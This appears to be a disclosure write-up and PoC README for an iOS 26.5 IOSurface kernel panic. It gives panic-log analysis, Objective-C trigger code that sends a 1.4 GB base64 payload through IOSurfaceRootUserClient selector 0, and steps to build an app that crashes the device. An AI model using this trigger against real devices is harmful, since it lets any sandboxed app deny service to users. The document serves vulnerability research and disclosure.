# IOSurface XML Data Panic

**Device**: iPhone 17 Pro (iPhone18,1)  
**OS**: iOS 26.5 RC 2 (23F77) — XNU 25.5.0 `xnu-12377.122.4~1`  
**Class**: Kernel data abort (translation fault, level 2)  
**Apple response**: Not a security vulnerability  

---

## Bug

`IOSurfaceRootUserClient` selector 0 (create surface) accepts the surface description as an XML property list passed in the `inputStruct` field of `IOConnectCallMethod`. The XML is parsed in-kernel by IOSurface. When the `IOSurfaceAddressRanges` key is present, the kernel processes its base64-encoded `<data>` payload as an array of address ranges. Sending a ~1.4 GB run of base64 characters causes a kernel data abort:

```
panic(cpu 5 caller 0xfffffe00522d1458): Kernel data abort. at pc 0xfffffe005214cf64,
lr 0x76867e005214cf50 (saved state: 0xfffffe7adabea310)
  ...
  x8:  0x0000000040000000   x10: 0x0000000040000001
  x22: 0x000000003fffffff   x24: 0x000000003fffffff
  far: 0x000000003fffffff   esr: 0x0000000096000046
```

`far: 0x000000003fffffff` — the kernel faulted trying to dereference `0x3fffffff` (~1 GB). ESR `0x96000046` is a data abort from lower EL, DFSC `0x06` = translation fault at level 2. The address is not a kernel virtual address; it is a large integer derived from the oversized data payload being used as a pointer.

The faulting kext is `com.apple.iokit.IOSurface 393.5.7`.

```
Kernel Extensions in backtrace:
   com.apple.iokit.IOSurface(393.5.7)[A0CFC976-7961-337F-AA3F-B9851AE06069]
   @0xfffffe00512ac410->0xfffffe00512db303
```

---

## Trigger path

Any sandboxed app can open `IOSurfaceRoot` and call selector 0. No entitlements beyond a standard installed app are required.

```objc
// Build the XML property list
static const char kIOSurfaceXMLPrefix[] =
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<dict>\n"
    "<key>IOSurfaceWidth</key><integer size=\"64\">1</integer>\n"
    "<key>IOSurfaceHeight</key><integer size=\"64\">1</integer>\n"
    "<key>IOSurfaceBytesPerElement</key><integer size=\"64\">4</integer>\n"
    "<key>IOSurfaceBytesPerRow</key><integer size=\"64\">4</integer>\n"
    "<key>IOSurfaceAllocSize</key><integer size=\"64\">4</integer>\n"
    "<key>IOSurfacePixelFormat</key><integer size=\"64\">0</integer>\n"
    "<key>IOSurfaceAddressRanges</key><data>\n";

// Fill ~1.4 GB with base64 'A' characters
memset(payload + prefixLen, 'A', 1408 * 1024 * 1024);

// Deliver via IOConnectCallMethod selector 0
IOConnectCallMethod(connection,
                    0 /* kIOSurfaceCreateSurface */,
                    scalarInput, 1,
                    payload, payloadSize,
                    NULL, NULL,
                    output, &outputSize);
// device panics before this returns
```

---

## PoC

`poc/` is an iOS Xcode project. Build for a physical device running iOS 26.5, install, and tap **Trigger XML Data**. The device will panic within a few seconds while building and submitting the payload.

`panic-full-2026-05-10-115811.0002.ips` is the captured panic log from the test device.

---

## Notes

The bug is a missing or insufficient bounds check in IOSurface's XML property list path for `IOSurfaceAddressRanges`. The kernel faults rather than corrupting memory, which is why Apple closed it as not a security vulnerability. The fault is nonetheless reachable from an unprivileged sandbox — any installed app can reliably crash the device.
